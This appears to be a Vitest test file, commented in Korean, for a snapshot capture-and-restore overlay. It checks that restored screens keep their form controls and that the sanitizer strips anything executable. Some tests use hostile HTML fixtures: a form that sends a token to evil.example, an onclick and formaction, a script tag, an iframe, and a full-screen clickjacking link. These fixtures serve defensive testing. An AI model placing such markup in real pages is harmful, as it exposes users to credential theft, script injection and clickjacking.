import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { captureSnapshot } from '../src/capture';
import { mountOverlay, removeOverlay } from '../src/overlay';
import type { PrepaintPolicy } from '../src/types';

const TEST_POLICY = { routes: ['/'] } satisfies PrepaintPolicy;

/**
 * capture -> restore 전 구간의 시각 충실도를 검증한다.
 *
 * 기존 테스트는 단계별로만 검증한다. capture.test.ts는 capture 산출물을,
 * sanitize.test.ts는 mount sanitizer를 각각 본다. 두 단계 사이에서
 * 무엇이 사라지는지는 어느 쪽도 보지 않는다.
 */

function mountRestored(html: string): ShadowRoot {
  mountOverlay(html);
  const host = document.getElementById('__firsttx_prepaint__');
  if (!host?.shadowRoot) throw new Error('overlay did not mount');
  return host.shadowRoot;
}

describe('capture -> restore 시각 충실도', () => {
  beforeEach(() => {
    document.head.innerHTML = '';
    document.body.innerHTML = `
      <div id="root">
        <div class="dashboard">
          <h1>주문 관리</h1>
          <input type="search" value="주문번호" placeholder="검색" />
          <button type="button">새로고침</button>
          <select><option>전체</option><option>배송중</option></select>
          <table><tbody><tr><td>ORD-1001</td><td>배송중</td></tr></tbody></table>
          <textarea>메모</textarea>
        </div>
      </div>
    `;
  });

  afterEach(() => {
    removeOverlay();
  });

  it('capture 단계는 form control을 보존한다', async () => {
    const snapshot = await captureSnapshot(TEST_POLICY);

    expect(snapshot).not.toBeNull();
    expect(snapshot!.body).toContain('<button');
    expect(snapshot!.body).toContain('<input');
    expect(snapshot!.body).toContain('<select');
    expect(snapshot!.body).toContain('<textarea');
  });

  it('restore 후에도 사용자가 보던 화면이 남아야 한다', async () => {
    const snapshot = await captureSnapshot(TEST_POLICY);
    const shadow = mountRestored(snapshot!.body);

    // 텍스트·구조는 살아 있다
    expect(shadow.querySelector('h1')?.textContent).toBe('주문 관리');
    expect(shadow.querySelector('td')?.textContent).toBe('ORD-1001');

    // 대상 사용자는 내부 도구(대시보드·CRM)다. 화면의 조작 요소가
    // 통째로 사라지면 "직전 화면 재생"이라는 계약이 성립하지 않는다.
    expect(shadow.querySelector('button'), '새로고침 버튼').not.toBeNull();
    expect(shadow.querySelector('input'), '검색 입력창').not.toBeNull();
    expect(shadow.querySelector('select'), '상태 필터').not.toBeNull();
    expect(shadow.querySelector('textarea'), '메모 영역').not.toBeNull();
  });

  it('form control을 살려도 실행 가능한 것은 남지 않는다', async () => {
    document.body.innerHTML = `
      <div id="root">
        <form action="https://evil.example/steal" method="post">
          <input name="token" value="secret" />
          <button onclick="steal()" formaction="https://evil.example/x">전송</button>
        </form>
        <script>alert(1)</script>
        <iframe src="https://evil.example"></iframe>
      </div>
    `;

    const snapshot = await captureSnapshot(TEST_POLICY);
    const shadow = mountRestored(snapshot!.body);
    const html = shadow.innerHTML;

    // form control 자체는 남아 있어야 이 단언들이 공허하지 않다
    expect(shadow.querySelector('form')).not.toBeNull();
    expect(shadow.querySelector('button')).not.toBeNull();

    expect(html).not.toContain('<script');
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('formaction');
    expect(shadow.querySelector('form')?.getAttribute('action')).toBeNull();
    expect(shadow.querySelector('form')?.getAttribute('method')).toBeNull();
  });

  it('덮어씌운 링크가 클릭될 수 있어도 갈 곳이 없다', async () => {
    document.body.innerHTML = `
      <div id="root">
        <a href="https://evil.example"
           style="pointer-events:auto; position:fixed; inset:0; z-index:9999">덮개</a>
      </div>
    `;

    const snapshot = await captureSnapshot(TEST_POLICY);
    const shadow = mountRestored(snapshot!.body);
    const anchor = shadow.querySelector('a');

    expect(anchor).not.toBeNull();
    expect(anchor!.getAttribute('href')).toBeNull();
    expect(anchor!.getAttribute('style')).not.toContain('pointer-events');
  });
});
